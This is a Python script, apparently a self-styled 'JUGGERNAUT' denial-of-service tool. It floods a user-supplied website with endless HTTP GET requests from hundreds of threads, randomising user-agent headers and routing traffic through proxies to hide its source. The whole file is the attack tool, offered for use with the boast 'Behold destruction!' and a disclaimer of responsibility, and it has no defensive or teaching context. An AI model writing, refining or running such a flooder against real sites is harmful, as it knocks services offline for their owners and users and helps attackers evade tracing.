import sys
import signal
import requests
import threading
import random

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow
B = '\033[1m'   # bold
NB = '\033[0m'  # not bold
colors = [G, C, R]

banner = f'''{random.choice(colors)}
     ██╗ ██╗   ██╗  ██████╗   ██████╗  ███████╗ ██████╗  ███╗   ██╗  █████╗  ██╗   ██╗ ████████╗
     ██║ ██║   ██║ ██╔════╝  ██╔════╝  ██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██║   ██║ ╚══██╔══╝
     ██║ ██║   ██║ ██║  ███╗ ██║  ███╗ █████╗   ██████╔╝ ██╔██╗ ██║ ███████║ ██║   ██║    ██║   
██   ██║ ██║   ██║ ██║   ██║ ██║   ██║ ██╔══╝   ██╔══██╗ ██║╚██╗██║ ██╔══██║ ██║   ██║    ██║   
╚█████╔╝ ╚██████╔╝ ╚██████╔╝ ╚██████╔╝ ███████╗ ██║  ██║ ██║ ╚████║ ██║  ██║ ╚██████╔╝    ██║   
 ╚════╝   ╚═════╝   ╚═════╝   ╚═════╝  ╚══════╝ ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═╝  ╚═╝  ╚═════╝     ╚═╝   
 
 version 1.0
{W}                                                                                                                            
'''
print(banner)

def killprogram(signum, frame):
    print("Exiting program, bye")
    while True:
        sys.exit(0)

signal.signal(signal.SIGINT, killprogram)

def load_headers():
    file = open("headers.txt")
    lines = file.readlines()
    for i in range(len(lines)):
        lines[i] = lines[i][:-2]

    return lines

def load_proxies():
    file = open("proxy.txt", "r")
    lines = file.readlines()
    for i in range(len(lines)):
        lines[i] = lines[i].replace('\n', '')
    return lines

print(f"{Y}Note: The default proxy.txt may become obsolete with time.\nSo you can download your own proxy list from net and replace it\nAlso make sure to name your proxy list as proxy.txt\nIn case attack with proxy does not work then try without proxy\nKeep on pressing CTRL + C or close the terminal when you want to stop attack{W}\n")
print(f"{R}{B}WARNING: I AM NOT RESPONSIBLE FOR YOUR ACTS{NB}{W}\n")
agents = load_headers()
print(f"{C}Headers Loaded!{W}")
proxies_loaded = False
try:
    proxies_loaded = True
    proxies = load_proxies()
    print(f"{C}Proxies Loaded!{W}")
except Exception:
    proxies_loaded = False
    print(f"{R}No Proxies loaded, continuing without proxies{W}")

def set_headers():

    return {
        "Host": host,
        "User-Agent": random.choice(agents),
        "Accept-Language": "en-us",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache",
        "Keep-Alive": str(random.randint(110, 120))
    }

def set_proxies():
    proxy = random.choice(proxies)
    proxy.split(":")
    proxy = proxy.split(":")

    return {
        proxy[0]: proxy[1]
    }


def AttackWithProxy():
    while True:
        try:
            requests.get(site, headers=set_headers(), proxies=set_proxies())
        except KeyboardInterrupt:
            exit(0)
def AttackWithoutProxy():
    while True:
        try:
            requests.get(site, headers=set_headers())
        except KeyboardInterrupt:
            exit(0)
print()
site = input("Enter url of the site you want to attack: ")

host = site
if "http://" in host:
    host = host.replace("http://", '')

elif "https://" in host:
    host = host.replace("https://", '')

if "www." in host:
    pass
else:
    host = "www." + host

try:
    print(f"{C}Checking authenticity of the url{W}")
    requests.get(site)
except Exception as e:
    print(e)
    exit()
print(f"{G}The url is valid{W}")

threads = input("Enter the number of threads you want to use(default:500): ")

if threads == '':
    threads = 500

else:
    try:
        threads = int(threads)
    except ValueError:
        print(f"{R}A number was expected{W}")
        exit()

    if int(threads) <= 0:
        print(f"{R}Number of threads cannot be < 1{W}")

use_proxies = input("Do you want to use proxies(Y/n): ")
if use_proxies == '':
    use_proxies = True
elif use_proxies == 'y' or use_proxies == 'Y':
    use_proxies = True
elif use_proxies == 'N' or use_proxies == 'n':
    use_proxies = False
else:
    print(f"{R}Invalid Input! Assuming that you want to use proxies{W}")
    use_proxies = True

if proxies_loaded and use_proxies:
    print(f"{G}Starting attack with proxies{W}")
    print()
    try:
        for i in range(threads):
            threading.Thread(target=AttackWithProxy, daemon=True).start()
        print(f"{C}Attack Started, Behold destruction!{W}")
    except KeyboardInterrupt:
        exit()
else:
    print(f"{Y}Starting attack without proxies{W}")
    print()
    try:
        for i in range(threads):
            threading.Thread(target=AttackWithoutProxy, daemon=True).start()
        print(f"{C}Attack Started, Behold destruction!{W}")
    except KeyboardInterrupt:
        exit()


# main thread
if proxies_loaded and use_proxies:
    while True:
        r = requests.get(site, headers=set_headers(), proxies=set_proxies())

else:
    while True:
        requests.get(site, headers=set_headers())
